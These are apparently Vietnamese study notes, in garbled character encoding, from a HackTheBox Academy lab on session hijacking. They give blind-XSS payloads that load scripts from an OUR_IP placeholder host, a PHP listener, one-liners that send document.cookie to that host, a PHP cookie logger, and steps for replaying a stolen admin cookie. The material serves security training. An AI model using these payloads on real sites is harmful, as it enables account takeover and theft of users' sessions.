
# ğŸ“˜ Session Hijacking â€“ HackTheBox Academy  
*PhiÃªn báº£n ghi chÃ©p tinh chá»‰nh, dá»… hiá»ƒu*

---

# Table of Contents
- [1. Giá»›i thiá»‡u](#1-giá»›i-thiá»‡u)
- [2. Blind XSS lÃ  gÃ¬?](#2-blind-xss-lÃ -gÃ¬)
- [3. TÃ¬m input bá»‹ Blind XSS](#3-tÃ¬m-input-bá»‹-blind-xss)
- [4. Remote Script Loading](#4-remote-script-loading)
- [5. Thiáº¿t láº­p listener](#5-thiáº¿t-láº­p-listener)
- [6. TÃ¬m payload XSS hoáº¡t Ä‘á»™ng](#6-tÃ¬m-payload-xss-hoáº¡t-Ä‘á»™ng)
- [7. Session Hijacking](#7-session-hijacking)
- [8. Cookie Stealer Script](#8-cookie-stealer-script)
- [9. Thay cookie Ä‘á»ƒ login](#9-thay-cookie-Ä‘á»ƒ-login)

---

# 1. Giá»›i thiá»‡u
CÃ¡c web app hiá»‡n Ä‘áº¡i dÃ¹ng **cookies** Ä‘á»ƒ duy trÃ¬ session.  
Náº¿u attacker Ä‘Ã¡nh cáº¯p cookie â†’ cÃ³ thá»ƒ Ä‘Äƒng nháº­p nhÆ° náº¡n nhÃ¢n *khÃ´ng cáº§n máº­t kháº©u*.  
Äáº·c biá»‡t, khi cÃ³ thá»ƒ thá»±c thi JavaScript trÃªn trÃ¬nh duyá»‡t náº¡n nhÃ¢n (XSS), ta cÃ³ thá»ƒ gá»­i cookie vá» server cá»§a mÃ¬nh â†’ **session hijacking**.

---

# 2. Blind XSS lÃ  gÃ¬?
Blind XSS xáº£y ra khi:
- Payload khÃ´ng cháº¡y trÃªn trang báº¡n Ä‘ang tháº¥y  
- MÃ  cháº¡y trÃªn trang *admin panel* hoáº·c há»‡ thá»‘ng ná»™i bá»™ khÃ¡c.

VÃ­ dá»¥ vá»‹ trÃ­ dá»… bá»‹ Blind XSS:
- Form liÃªn há»‡
- Form Ä‘Ã¡nh giÃ¡
- Support ticket
- User-Agent header
- TrÆ°á»ng profile edit

ğŸ‘‰ Má»¥c tiÃªu: **PhÃ¡t hiá»‡n input nÃ o bá»‹ XSS dÃ¹ khÃ´ng tháº¥y káº¿t quáº£ hiá»ƒn thá»‹.**

---

# 3. TÃ¬m input bá»‹ Blind XSS
Ta dÃ¹ng trick: khi JavaScript cháº¡y â†’ tá»± Ä‘á»™ng gá»­i request vá» server cá»§a ta.

NhÆ°ng cÃ³ hai váº¥n Ä‘á»:
1. KhÃ´ng biáº¿t **field nÃ o** kÃ­ch hoáº¡t XSS.  
2. KhÃ´ng biáº¿t **payload nÃ o** sáº½ hoáº¡t Ä‘á»™ng.

â†’ Giáº£i phÃ¡p: **load remote script**, má»—i field sá»­ dá»¥ng má»™t endpoint khÃ¡c nhau.

---

# 4. Remote Script Loading
HTML cho phÃ©p load script tá»« URL:

```html
<script src="http://OUR_IP/script.js"></script>
```

Ta Ä‘á»•i script name thÃ nh tÃªn input:

```html
<script src="http://OUR_IP/username"></script>
<script src="http://OUR_IP/fullname"></script>
```

â†’ Náº¿u server nháº­n request `/username` â†’ field `username` bá»‹ XSS.

Payload máº«u tá»« PayloadsAllTheThings:

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval("var a=document.createElement('script');a.src='http://OUR_IP';document.body.appendChild(a')")
<script>$.getScript("http://OUR_IP")</script>
```

---

# 5. Thiáº¿t láº­p listener
DÃ¹ng PHP lÃ m webserver Ä‘á»ƒ nháº­n request:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

Náº¿u ai Ä‘Ã³ load script â†’ terminal sáº½ hiá»ƒn thá»‹ request Ä‘áº¿n.

---

# 6. TÃ¬m payload XSS hoáº¡t Ä‘á»™ng
Test tá»«ng input:

```html
<script src=http://OUR_IP/fullname></script>
<script src=http://OUR_IP/username></script>
```

Khi tháº¥y request vá» server â†’  
âœ“ Biáº¿t field nÃ o vulnerable  
âœ“ Biáº¿t payload nÃ o cháº¡y Ä‘Æ°á»£c

---

# 7. Session Hijacking
Khi Ä‘Ã£ cÃ³ payload hoáº¡t Ä‘á»™ng â†’ ta inject JS Ä‘á»ƒ gá»­i cookie vá» server.

Payload phá»• biáº¿n:

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
```

Hoáº·c loáº¡i stealth hÆ¡n:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

---

# 8. Cookie Stealer Script
Táº¡o file **script.js** trÃªn server:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Táº¡o file **index.php** Ä‘á»ƒ lÆ°u cookie:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}
");
        fclose($file);
    }
}
?>
```

â†’ Má»—i khi admin xem dá»¯ liá»‡u â†’ cookie bá»‹ gá»­i vá» `cookies.txt`.

---

# 9. Thay cookie Ä‘á»ƒ login
VÃ o Firefox â†’ DevTools â†’ Storage â†’ Cookies  
ThÃªm cookie:

- **Name** = pháº§n trÆ°á»›c dáº¥u `=`
- **Value** = pháº§n sau dáº¥u `=`

Refresh â†’ Ä‘Äƒng nháº­p thÃ nh admin.
